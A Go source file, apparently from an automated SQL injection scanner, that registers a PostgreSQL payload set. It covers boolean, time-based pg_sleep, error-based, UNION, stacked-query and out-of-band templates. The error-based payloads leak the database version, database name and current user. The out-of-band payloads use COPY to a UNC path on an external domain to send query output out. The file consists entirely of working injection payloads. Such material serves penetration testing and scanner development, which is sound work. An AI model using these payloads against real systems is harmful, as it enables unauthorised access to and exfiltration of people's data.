package dbms

func init() {
	register(&Payloads{
		Name: Postgres,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig} AND 1=1-- -", False: "{orig} AND 1=2-- -"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}' AND 'a'='a'", False: "{orig}' AND 'a'='b'"},
			{True: "({orig}) AND 1=1", False: "({orig}) AND 1=2"},
			{True: "{orig} AND (SELECT 1)=1", False: "{orig} AND (SELECT 1)=2"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634)=(SELECT 8634)", False: "{orig} AND (SELECT 8634)=(SELECT 8635)"},
			{True: "{orig}' AND (SELECT 8634)=(SELECT 8634)-- -", False: "{orig}' AND (SELECT 8634)=(SELECT 8635)-- -"},
			{True: "{orig} AND (SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END)=1", False: "{orig} AND (SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END)=2"},
		},
		Time: []TimeTpl{
			{Payload: "{orig} AND pg_sleep({delay})", Risk: 1},
			{Payload: "{orig}' AND pg_sleep({delay})-- -", Risk: 1},
			{Payload: "{orig};SELECT pg_sleep({delay})-- -", Risk: 1},
			{Payload: "{orig}') AND pg_sleep({delay})-- -", Risk: 2},
			{Payload: "{orig}' OR pg_sleep({delay})-- -", Risk: 2},
			{Payload: "{orig}' AND (SELECT pg_sleep({delay}))-- -", Risk: 1},
			{Payload: "{orig} AND (SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)", Risk: 1},
		},
		Error: []string{
			"{orig}' AND CAST((SELECT version()) AS int)-- -",
			"{orig}' AND (SELECT 1/(0))-- -",
			"{orig}' AND (SELECT CASE WHEN 1=1 THEN (SELECT 1/(0)) ELSE 1 END)-- -",
			"{orig}' AND 1=CAST((SELECT current_database()) AS int)-- -",
			"{orig}' AND 1=CAST((SELECT current_user) AS int)-- -",
			"{orig}'",
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION ALL SELECT {cols}-- -",
				"{orig} UNION SELECT {cols}-- -",
			},
		},
		Stacked: []TimeTpl{
			{Payload: "{orig}';SELECT pg_sleep({delay});-- -", Risk: 2},
			{Payload: "{orig};SELECT pg_sleep({delay})-- -", Risk: 2},
		},
		OOB: []string{
			"{orig}';COPY (SELECT version()) TO '\\\\\\\\{domain}\\\\{unc}';-- -",
			"{orig}';CREATE TABLE {unc}(x text);COPY {unc} FROM '\\\\\\\\{domain}\\\\{unc}';-- -",
		},
		StackedOK: true,
	})
}
